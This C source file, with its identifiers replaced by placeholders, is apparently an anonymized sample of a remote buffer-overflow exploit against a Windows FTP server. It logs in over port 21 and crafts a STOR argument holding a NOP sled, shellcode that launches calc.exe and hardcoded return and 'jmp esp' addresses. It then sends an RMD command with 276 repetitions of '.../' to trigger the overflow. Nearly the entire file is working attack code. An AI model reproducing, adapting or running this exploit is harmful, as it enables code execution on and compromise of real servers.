
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int tmp ;
struct TYPE_2__ {int s_addr; } ;
struct sockaddr_in {int sin_port; TYPE_1__ sin_addr; int sin_family; } ;
struct sockaddr {int dummy; } ;
typedef int buf ;
typedef int WSADATA ;
typedef int WORD ;


 int VAR_0 ;
 int FUNC_0 (int) ;
 int FUNC_1 (int,int) ;
 int VAR_1 ;
 int FUNC_2 (int ,int *) ;
 int FUNC_3 (char*,int,char*,char*) ;
 int FUNC_4 (int,struct sockaddr*,int) ;
 int FUNC_5 (int) ;
 char* FUNC_6 (int) ;
 int FUNC_7 (int) ;
 int FUNC_8 (char*) ;
 int FUNC_9 (int,char*,char*) ;
 int FUNC_10 (char*,char*,int) ;
 int FUNC_11 (char*,int,int) ;
 int FUNC_12 (char*,...) ;
 int FUNC_13 (int,char*,int,int ) ;
 int FUNC_14 (int ,int ,int ) ;
 int FUNC_15 (char*,char*) ;
 int FUNC_16 (char*,char*) ;
 int FUNC_17 (char*) ;

void FUNC_18 (char *VAR_2, char *VAR_3, char *VAR_4)
{
 WORD VAR_5;
 WSADATA VAR_6;
 int VAR_7, VAR_8,VAR_9;
 struct sockaddr_in VAR_10;
 char VAR_11[2000],VAR_12[1000];


 char *VAR_13=
  "\x33\xc0"
  "\x50"
  "\x68\x2e\x65\x78\x65"
  "\x68\x63\x61\x6c\x63"
  "\x54"
  "\xba\x44\x80\xc2\x77"
  "\xff\xd2";


 VAR_5 = FUNC_1( 2, 2 );
 VAR_8 = FUNC_2( VAR_5, &VAR_6 );
 if ( VAR_8 != 0 ) {
  FUNC_12 ("ERROR: Sorry, cannot create socket!!!\n");
  FUNC_0(-1);
 }

 VAR_7=FUNC_14(VAR_0,VAR_1,0);


 VAR_10.sin_family=VAR_0;
 VAR_10.sin_addr.s_addr = FUNC_8(VAR_2);
 VAR_10.sin_port = FUNC_7(21);

 if (FUNC_4(VAR_7,(struct sockaddr*)&VAR_10, sizeof(struct sockaddr)) == -1) {
  FUNC_12 ("CONNECT :(((\n");
  FUNC_0(-1);
 }

 if (FUNC_9(VAR_7,VAR_3,VAR_4) == -1)
 {
  FUNC_12 ("ERROR: Cannot login to FTP server, sorry!!!\n");
  FUNC_5(-1);
 }

 FUNC_11(VAR_12,0,sizeof(VAR_12));
 FUNC_11 (VAR_12,0x90,180);


 FUNC_10 (&VAR_12[80],VAR_13,FUNC_17(VAR_13));
 *(long*)&VAR_12[158] = 0x77da52b8;
 *(long*)&VAR_12[166] = 0x74ec8390;
 *(long*)&VAR_12[170] = 0x9090e4ff;


 FUNC_3 (VAR_11,sizeof(VAR_11),"STOR %s\r\n", VAR_12);

 FUNC_12 ("DEBUG: %.30s %d\n",VAR_11,FUNC_17(VAR_11));
 FUNC_13 (VAR_7,VAR_11,FUNC_17(VAR_11),0);
 FUNC_12 ("%s\n",FUNC_6(VAR_7));

 FUNC_16(VAR_11,"RMD ");
 for (VAR_9=0;VAR_9<276;VAR_9++)
  FUNC_15 (VAR_11,".../");
 FUNC_15(VAR_11,"\r\n");

 FUNC_12 ("Sending exploit strings\n");
 FUNC_13 (VAR_7,VAR_11,FUNC_17(VAR_11),0);
 FUNC_12 ("recv: %s\n",FUNC_6(VAR_7));


}
